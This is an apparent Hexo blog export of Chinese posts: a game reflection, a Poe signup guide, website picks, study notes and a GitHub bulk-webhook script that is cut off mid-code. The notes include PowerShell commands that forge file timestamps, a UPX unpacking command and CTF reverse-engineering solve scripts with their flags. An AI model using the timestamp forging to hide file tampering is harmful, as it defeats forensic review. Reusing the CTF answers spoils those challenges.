<p>不知不觉中，你就成为了我的第一倾诉对象</p>
<p>还记得我们的第一次约会吗?</p>
<p><font color='green'>你和我去看我最喜欢的”猫耳摩斯”电影。然后又带我去吃我最喜欢的麻辣火锅。大概你有仔细看过我朋友圈吧?</font></p>
<p><font color='green'>知道你事前有好好为约会准备，我当时还是挺感动的</font></p>
<p>还记得我们的第一次牵手吗?</p>
<p><font color='green'>那天晚上月色很美。我到现在还记得你静静牵起我手时的感觉。我们就这样开始了。</font></p>
<p>在一起以后，我们有了更多的时间去了解彼此</p>
<p>我们谈论共同的兴趣爱好，生活中大小事情</p>
<p>和你在一起的日子大多都是甜蜜的，然而我们有时也会吵架</p>
<p><font color='green'>但庆幸我们能够相互谅解。一点点的争吵反而成为我们加深了解的机会</font></p>
<p>有时我会想你听我抱怨生活中的那那些烦心事</p>
<p><font color='green'>而你总能够在我需要的时候，做一个安静的聆听者</font></p>
<p><font color='green'>陪在我身边，静静听我讲那些生活中的琐碎事情。</font></p>
<p>我知道我们都并不完美。</p>
<p><font color='green'>好在我们知道怎样平衡彼此的关系，而不是一味依赖某一方</font></p>
<p>这或许是我第一次这么毫无保留地向你透露心声</p>
<p>我只是希望你能够理解我的心情，多点关心我</p>
<p>希望在我们的下一个三年里，我们能够更好地相处吧。相识周年纪念日快乐!</p>
</blockquote>
]]></content>
      <categories>
        <category>游戏心得</category>
      </categories>
      <tags>
        <tag>内心深处的呐喊-《拣爱》</tag>
      </tags>
  </entry>
  <entry>
    <title>【福音】我推荐你通过Poe来使用各大AI产品</title>
    <url>/posts/e7a38f19.html</url>
    <content><![CDATA[<h1 id="【福音】我推荐你通过-Poe-来使用各大-AI-产品"><a href="#【福音】我推荐你通过-Poe-来使用各大-AI-产品" class="headerlink" title="【福音】我推荐你通过 Poe 来使用各大 AI 产品"></a>【福音】我推荐你通过 Poe 来使用各大 AI 产品</h1><p>今天下午在群里看到师哥（<font color="red">感谢林哥嘿嘿</font> ）推荐的一个 AI 平台，我尝试了一下，我的评价：很好。</p>
<h2 id="前期碎碎念"><a href="#前期碎碎念" class="headerlink" title="前期碎碎念"></a>前期碎碎念</h2><p>首先我开篇点题推荐他的理由</p>
<blockquote>
<p>好处：</p>
<ol>
<li>注册简单，对新手很友好</li>
<li>基础功能免费</li>
<li>支持墙内邮箱，对注册邮箱无限制</li>
<li>集成各大 AI 产品，目前本区域可用的不可用的都可以使用，比如 ChatGPT、Gemini-Pro、Claude-3、Qwen（通义千问）、Solar-Mini、RekaFlash、Mixtral 等等。</li>
</ol>
<p>缺点：</p>
<ol>
<li>free 版有日限制次数，每个账户 3k 点询问数值，大约可以问几百次</li>
</ol>
<p>其他注意事项：</p>
<ol>
<li>高级版 AI 需要订阅，价格大约 20 刀&#x2F;月，其实 free 版对于一般用户来说足够了</li>
<li>虽然日限制 3k 次，3k 次也不是小数目，如果实在不够的话，可以换账号继续用</li>
</ol>
</blockquote>
<p>说了这么多了,开始正事,下面给出注册教程</p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>首先你需要准备:</p>
<ol>
<li>一个能浏览墙外学习资源的工具(这个我之前提到过了,可以看<a href="/posts/80f8b1da">这个帖子</a>注册)</li>
<li>一个能收信发信的邮箱</li>
</ol>
<h2 id="开始注册"><a href="#开始注册" class="headerlink" title="开始注册"></a>开始注册</h2><h3 id="登陆官网"><a href="#登陆官网" class="headerlink" title="登陆官网"></a>登陆官网</h3><p>首先挂上魔法,进入<a class="link"   href="https://poe.com/" >Poe 官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Poe/image-20240329165158784.png"
                      alt="image-20240329165158784"
                ></p>
<p>这里有很自由的注册方式,你可以通过 Google 邮箱,也可以通过 Apple 账号(<font color="red">我没试过</font>),然后下面通过邮箱账号,可以是 outlook,甚至可以是 QQ 邮箱.</p>
<p>我选择的是 Google 邮箱直接登录.</p>
<h3 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h3><p>成功之后就可以选择一个对话开始使用了，操作对新手及其的友好</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Poe/image-20240329171152824.png"
                      alt="image-20240329171152824"
                ></p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><h4 id="用Poe"><a href="#用Poe" class="headerlink" title="用Poe"></a>用Poe</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Poe/image-20240329172035427.png"
                      alt="image-20240329172035427"
                ></p>
<h4 id="用官方ChatGPT"><a href="#用官方ChatGPT" class="headerlink" title="用官方ChatGPT"></a>用官方ChatGPT</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Poe/image-20240329172058399.png"
                      alt="image-20240329172058399"
                ></p>
<hr>
<p>除此之外还可以下载Android，Windows应用，整体体验还算不错</p>
]]></content>
      <categories>
        <category>技术教程</category>
      </categories>
      <tags>
        <tag>ChatGPT</tag>
        <tag>AI</tag>
        <tag>Gemini-Pro</tag>
        <tag>Claude-3</tag>
      </tags>
  </entry>
  <entry>
    <title>一些好玩的网站</title>
    <url>/posts/cc76d308.html</url>
    <content><![CDATA[<h1 id="1-致美化"><a href="#1-致美化" class="headerlink" title="1.致美化"></a>1.<a class="link"   href="https://zhutix.com/" >致美化<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h1><p>windows美化</p>
<p>致美化是一个老牌桌面美化分享站，创办于 2014 年。探索丰富多彩的主题、壁纸、图标、皮肤等酷炫的美化素材，更有全面的美化教程及工具，是一个比较良心的美化站。</p>
<h1 id="2-在线文件转换器"><a href="#2-在线文件转换器" class="headerlink" title="2.在线文件转换器"></a>2.<a class="link"   href="https://cn.cloud-converter.com/" >在线文件转换器<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h1><p>使用这款免费快速在线转换器. 将pdf, 图像, 视频, 文档, 音频, 电子书及压缩等文件格式转换为其他格式。现支持超过20200多种不同格式转换。</p>
<h1 id="3-从0开始做博客"><a href="#3-从0开始做博客" class="headerlink" title="3.从0开始做博客"></a>3.<a class="link"   href="https://zhuanlan.zhihu.com/p/102592286" >从0开始做博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h1><p>不用介绍什么了，这是知乎大佬收集的一篇文章，我的博客就是根据这个搭建的</p>
]]></content>
      <categories>
        <category>网站收录</category>
      </categories>
      <tags>
        <tag>网站收录</tag>
      </tags>
  </entry>
  <entry>
    <title>一些零碎的知识点</title>
    <url>/posts/93fef3f.html</url>
    <content><![CDATA[<h1 id="关于二维码"><a href="#关于二维码" class="headerlink" title="关于二维码"></a>关于二维码</h1><p>二维码除了定位点不能被遮挡外，其他地方不是有数据冗余机制嘛，允许10%-20%以内的遮挡&#x2F;噪声好像是</p>
<p>不同软件算法可能不一样，有的能算出来原始数据，有的算不出来</p>
<p>这也是那个stable diffusion生成二维码能契合原图的原因</p>
<p>在生成二维码的时候，由于有这部分冗余的存在，在一定程度上“丢掉”某些颜色差异与底图过大的信息是不影响数据表达的。但会影响传输可靠性</p>
<p>比如这个码你很难在 摄像设备歪斜&#x2F;远距离&#x2F;模糊的展板 的情况下成功扫出来</p>
<p>——来自芃哥</p>
<h1 id="修改文件创建时间等"><a href="#修改文件创建时间等" class="headerlink" title="修改文件创建时间等"></a>修改文件创建时间等</h1><p>使用windows自带的powershell即可，win+r键，输入powershell,在弹出的命令窗口输入命令，以abc.txt举例</p>
<p>1.修改文件创建时间</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(Get-Item abc.txt).creationtime=$(Get-Date &quot;11/04/2019 20:42:23&quot;)</span><br></pre></td></tr></table></figure></div>

<p>2.修改文件最后访问时间</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(Get-Item abc.txt).lastaccesstime=$(Get-Date &quot;11/04/2019 20:42:23&quot;)</span><br></pre></td></tr></table></figure></div>

<p>3.修改文件最后修改时间</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(Get-Item abc.txt).lastwritetime=$(Get-Date &quot;11/04/2019 20:42:23&quot;)</span><br></pre></td></tr></table></figure></div>

<h1 id="关于Python—base64编码"><a href="#关于Python—base64编码" class="headerlink" title="关于Python—base64编码"></a>关于Python—base64编码</h1><p>crypt &#x3D; base64.b64encode(enc.encode(‘utf-8’)).decode(‘utf-8’)</p>
<p>cipher &#x3D; base64.b64decode(crypt).decode(‘utf-8’)</p>
<p>关于这两段为什么要写两个utf-8</p>
<p>​                                 </p>
<h1 id="关于Python解密"><a href="#关于Python解密" class="headerlink" title="关于Python解密"></a>关于Python解密</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">Str = <span class="string">&quot;ylqq]aycqyp&#123;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(Str)):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (Str[i] &lt;= <span class="built_in">chr</span>(<span class="number">94</span>) <span class="keyword">or</span> Str[i] &gt; <span class="built_in">chr</span>(<span class="number">96</span>)) <span class="keyword">and</span> (Str[i] &lt;= <span class="built_in">chr</span>(<span class="number">62</span>) <span class="keyword">or</span> Str[i] &gt; <span class="built_in">chr</span>(<span class="number">64</span>)):</span><br><span class="line"></span><br><span class="line">     flag.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(Str[i])+<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">     flag.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(Str[i])-<span class="number">24</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 知识点</span></span><br><span class="line"><span class="comment"># flag要写为列表，字符串不可以直接相加减</span></span><br><span class="line"><span class="comment"># 做加减法的时候要先ord转化在加减然后转化为chr字符串</span></span><br><span class="line"><span class="comment"># 然后在字符操作</span></span><br><span class="line"><span class="comment"># 最后用join()拼接</span></span><br></pre></td></tr></table></figure></div>

<h1 id="关于Python找数组相同元素下标"><a href="#关于Python找数组相同元素下标" class="headerlink" title="关于Python找数组相同元素下标"></a>关于Python找数组相同元素下标</h1><p>可以直接用函数find，例如</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;</span></span><br><span class="line"></span><br><span class="line">len1=<span class="built_in">int</span>(<span class="built_in">len</span>(result)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len1):</span><br><span class="line"></span><br><span class="line">  s1 = s.find(result[i * <span class="number">2</span>]) - i</span><br><span class="line"></span><br><span class="line">  s2 = <span class="number">34</span> - s.find(result[i * <span class="number">2</span> + <span class="number">1</span>]) - i - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">     s2 = s2 + <span class="number">34</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">     flag += <span class="built_in">chr</span>(s1 * <span class="number">17</span> + s2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p>其中s.find(result[i<em>2])就是找s中和result[2</em>i]元素相同元素的下标</p>
<h1 id="关于upx加壳脱壳指令"><a href="#关于upx加壳脱壳指令" class="headerlink" title="关于upx加壳脱壳指令"></a>关于upx加壳脱壳指令</h1><p>upx.exe –o 别名.exe –d 现名.exe</p>
<p>-o：表示输出；</p>
<p>-o 别名.exe：表示以别名.exe作为脱壳后的输出；</p>
<p>-d 现名.exe：表示以现名.exe作为脱壳前的输入。</p>
<h1 id="关于Python切片"><a href="#关于Python切片" class="headerlink" title="关于Python切片"></a>关于Python切片</h1><p><a class="link"   href="https://blog.csdn.net/qq_30460949/article/details/118888961" >Python切片操作_小魔王降临的博客-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="关于IDA"><a href="#关于IDA" class="headerlink" title="关于IDA"></a>关于IDA</h1><p>交叉引用就是看哪段代码引用了这个变量</p>
<h1 id="关于C语言伪代码转化"><a href="#关于C语言伪代码转化" class="headerlink" title="关于C语言伪代码转化"></a>关于C语言伪代码转化</h1><h1 id="关于Python的random库"><a href="#关于Python的random库" class="headerlink" title="关于Python的random库"></a>关于Python的random库</h1><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(random.getrandbits(<span class="number">8</span>))    <span class="comment">#返回一个八位大小的整数</span></span><br><span class="line"></span><br><span class="line">扩展：<span class="number">8</span>位大小的整数是指二进制八位<span class="number">00000000</span>-<span class="number">11111111</span>的数，转换成十进制就是<span class="number">0</span>-<span class="number">255</span></span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">1</span>)             <span class="comment">#设置一个种子为1并生成随机数，设置种子后生成的随机数就是固定的（逆向题可用）</span></span><br></pre></td></tr></table></figure></div>



<h1 id="关于xor异或的逆运算"><a href="#关于xor异或的逆运算" class="headerlink" title="关于xor异或的逆运算"></a>关于xor异或的逆运算</h1><p>A&#x3D;A^B^B</p>
<h1 id="关于Python语法小记"><a href="#关于Python语法小记" class="headerlink" title="关于Python语法小记"></a>关于Python语法小记</h1><p>字符串连接时只能将字符和字符连接，flag+&#x3D;str（）</p>
<p>Ord是转化成对应的ascll</p>
<p>异或运算只能int类型，ord()^int()</p>
<p>定义字符串单双引号都可以</p>
<h1 id="关于大端序和小端序的区别"><a href="#关于大端序和小端序的区别" class="headerlink" title="关于大端序和小端序的区别"></a>关于大端序和小端序的区别</h1><p><a class="link"   href="https://blog.csdn.net/afanzcf/article/details/118788007" >BUUCTF SimpleRev（涉及大小端序存储的问题）_Afanbird的博客-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Casuall/article/details/98481469" >大端序和小端序_Casuall的博客-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>1、大端模式：高字节保存在内存的低地址</p>
<p>2、小端模式：高字节保存在内存的高地址</p>
<p>Big-endian：高位字节存入低地址，低位字节存入高地址</p>
<p>Little-endian：低位字节存入低地址，高位字节存入高地址</p>
<p>一般来说，x86系列CPU都是Little-endian字节序，PowerPC通常是Big-endian字节序。</p>
<h1 id="关于可以直接打进地址栏的文件类型"><a href="#关于可以直接打进地址栏的文件类型" class="headerlink" title="关于可以直接打进地址栏的文件类型"></a>关于可以直接打进地址栏的文件类型</h1><p>data:image&#x2F;png;base64,iVB………………………………</p>
<h1 id="关于base编码原理"><a href="#关于base编码原理" class="headerlink" title="关于base编码原理"></a>关于base编码原理</h1><p><a class="link"   href="https://www.cnblogs.com/0yst3r-2046/p/11962942.html" >Base系列编码浅析【base16 base32 base64 base85 base36 base 58 base91 base 92 base62】 - 0yst3r - 博客园 (cnblogs.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="关于CTF常见编码以及加解密"><a href="#关于CTF常见编码以及加解密" class="headerlink" title="关于CTF常见编码以及加解密"></a>关于CTF常见编码以及加解密</h1><p><a class="link"   href="https://www.cnblogs.com/ruoli-s/p/14206145.html" >CTF常见编码及加解密（超全） - ruoli-s - 博客园 (cnblogs.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="常用的在线编码工具"><a href="#常用的在线编码工具" class="headerlink" title="常用的在线编码工具"></a>常用的在线编码工具</h1><p><a class="link"   href="https://gchq.github.io/CyberChef/" >CyberChef (gchq.github.io)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/Ciphey/Ciphey" >Ciphey&#x2F;Ciphey: ⚡ Automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes ⚡ (github.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://www.hiencode.com/" >CTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码 (hiencode.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://ctf.bugku.com/tools" >在线工具 - Bugku CTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="关于ASCII逆向穷举"><a href="#关于ASCII逆向穷举" class="headerlink" title="关于ASCII逆向穷举"></a>关于ASCII逆向穷举</h1><p>例如：[ACTF新生赛2020]rome1</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a= <span class="string">&#x27;ACTF&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">enc=<span class="string">&#x27;Qsw3sj_lz4_Ujw@l&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line"></span><br><span class="line">     j=n</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> j &gt;<span class="number">64</span> <span class="keyword">and</span> j&lt;=<span class="number">90</span>:</span><br><span class="line"></span><br><span class="line">       j=(j-<span class="number">51</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> j&gt;<span class="number">96</span> <span class="keyword">and</span> j&lt;=<span class="number">122</span>:</span><br><span class="line"></span><br><span class="line">       j= (j-<span class="number">79</span>)%<span class="number">26</span> +<span class="number">97</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> j==<span class="built_in">ord</span>(enc[i]):</span><br><span class="line"></span><br><span class="line">       a=a+<span class="built_in">chr</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ACTF{Cae3ar_th4_Gre@t}</p>
<p>题目中意思是输入的字符经过一系列加密得到enc，在逆向的过程中可以用穷举的方法逐渐得到结果，以顺代逆</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>计算机</tag>
      </tags>
  </entry>
  <entry>
    <title>一键为你的所有Github仓库增加/删除指定Webhook</title>
    <url>/posts/697195e9.html</url>
    <content><![CDATA[<p>GitHub 提供了 Webhooks 功能，允许开发者在仓库发生特定事件时接收 HTTP 请求通知。如果你有大量的 GitHub 仓库，并希望为它们统一添加 Webhook，手动操作将是一项繁琐的任务。本文介绍了如何利用 Python 脚本实现一键为所有 GitHub 仓库添加 Webhook，以及如何一键删除这些 Webhook。</p>
<h3 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1. 准备工作"></a>1. 准备工作</h3><p>在开始之前，你需要确保以下准备工作已完成：</p>
<ul>
<li><strong>获取 GitHub Access Token</strong>：你需要拥有一个具有足够权限的 GitHub 帐户，并生成一个 Access Token，用于通过 API 访问你的仓库。注意保管好你的 Access Token，不要泄露给他人。</li>
<li><strong>准备 Webhook 地址</strong>：你需要准备一个用于接收 Webhook 通知的 URL 地址，可以是你自己搭建的服务器或者第三方服务。</li>
</ul>
<h3 id="2-添加-Webhook-的-Python-脚本"><a href="#2-添加-Webhook-的-Python-脚本" class="headerlink" title="2. 添加 Webhook 的 Python 脚本"></a>2. 添加 Webhook 的 Python 脚本</h3><p>下面是一个 Python 脚本，可以一键为你的所有 GitHub 仓库添加 Webhook：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_webhook</span>(<span class="params">repo_name, webhook_url, access_token</span>):</span><br><span class="line">    <span class="comment"># 构建请求头</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;token <span class="subst">&#123;access_token&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/vnd.github.v3+json&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 构建 Webhook 数据</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;web&quot;</span>,</span><br><span class="line">        <span class="string">&quot;active&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">        <span class="string">&quot;events&quot;</span>: [<span class="string">&quot;*&quot;</span>],</span><br><span class="line">        <span class="string">&quot;config&quot;</span>: &#123;<span class="string">&quot;url&quot;</span>: webhook_url, <span class="string">&quot;content_type&quot;</span>: <span class="string">&quot;json&quot;</span>&#125;,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 发送 POST 请求创建 Webhook</span></span><br><span class="line">    response = requests.post(</span><br><span class="line">        <span class="string">f&quot;https://api.github.com/repos/<span class="subst">&#123;repo_name&#125;</span>/hooks&quot;</span>,</span><br><span class="line">        headers=headers,</span><br><span class="line">        data=json.dumps(data),</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 处理响应</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">201</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;成功为 <span class="subst">&#123;repo_name&#125;</span> 创建 Webhook&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;无法为 <span class="subst">&#123;repo_name&#125;</span> 创建 Webhook。状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 填写你的 Access Token 和 Webhook 地址</span></span><br><span class="line">    access_token = <span class="string">&quot;你的access_token&quot;</span></span><br><span class="line">    webhook_url = <span class="string">&quot;你的Webhook地址&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化分页参数</span></span><br><span class="line">    page = <span class="number">1</span></span><br><span class="line">    per_page = <span class="number">30</span>  <span class="comment"># 每页多少个仓库，根据实际情况调整</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 获取当前页的仓库信息</span></span><br><span class="line">        response = requests.get(</span><br><span class="line">            <span class="string">&quot;https://api.github.com/user/repos&quot;</span>,</span><br><span class="line">            headers=&#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;token <span class="subst">&#123;access_token&#125;</span>&quot;</span>&#125;,</span><br><span class="line">            params=&#123;<span class="string">&quot;per_page&quot;</span>: per_page, <span class="string">&quot;page&quot;</span>: page&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            repos = response.json()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> repos:  <span class="comment"># 如果当前页没有仓库信息，说明已经获取完所有仓库</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> repo <span class="keyword">in</span> repos:</span><br><span class="line">                repo_name = repo[<span class="string">&quot;full_name&quot;</span>]</span><br><span class="line">                create_webhook(repo_name, webhook_url, access_token)</span><br><span class="line">            page += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;无法获取仓库列表。状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="3-删除-Webhook-的-Python-脚本"><a href="#3-删除-Webhook-的-Python-脚本" class="headerlink" title="3. 删除 Webhook 的 Python 脚本"></a>3. 删除 Webhook 的 Python 脚本</h3><p>如果需要删除已添加的 Webhook，可以使用以下 Python 脚本：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time  <span class="comment"># 导入时间模块</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_webhook</span>(<span class="params">repo_name, webhook_url, access_token</span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;token <span class="subst">&#123;access_token&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/vnd.github.v3+json&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取指定仓库的 Webhooks</span></span><br><span class="line">    response = requests.get(</span><br><span class="line">        <span class="string">f&quot;https://api.github.com/repos/<span class="subst">&#123;repo_name&#125;</span>/hooks&quot;</span>,</span><br><span class="line">        headers=headers,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        webhooks = response.json()</span><br><span class="line">        <span class="keyword">for</span> webhook <span class="keyword">in</span> webhooks:</span><br><span class="line">            <span class="keyword">if</span> webhook[<span class="string">&quot;config&quot;</span>][<span class="string">&quot;url&quot;</span>] == webhook_url:</span><br><span class="line">                <span class="comment"># 删除指定 Webhook</span></span><br><span class="line">                response_delete = requests.delete(</span><br><span class="line">                    <span class="string">f&quot;https://api.github.com/repos/<span class="subst">&#123;repo_name&#125;</span>/hooks/<span class="subst">&#123;webhook[<span class="string">&#x27;id&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">                    headers=headers,</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">if</span> response_delete.status_code == <span class="number">204</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;成功删除 <span class="subst">&#123;repo_name&#125;</span> 的指定 Webhook&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">f&quot;无法删除 <span class="subst">&#123;repo_name&#125;</span> 的指定 Webhook。状态码: <span class="subst">&#123;response_delete.status_code&#125;</span>&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>(response_delete.text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;repo_name&#125;</span> 中未找到指定的 Webhook&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;无法获取 <span class="subst">&#123;repo_name&#125;</span> 的 Webhooks。状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加延迟，以减慢请求频率</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)  <span class="comment"># 等待2秒钟，防止请求过于频繁</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_all_webhooks</span>(<span class="params">webhook_url, access_token</span>):</span><br><span class="line">    page = <span class="number">1</span></span><br><span class="line">    per_page = <span class="number">30</span>  <span class="comment"># 根据实际情况调整每页的数量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 获取当前页的仓库信息</span></span><br><span class="line">        response = requests.get(</span><br><span class="line">            <span class="string">&quot;https://api.github.com/user/repos&quot;</span>,</span><br><span 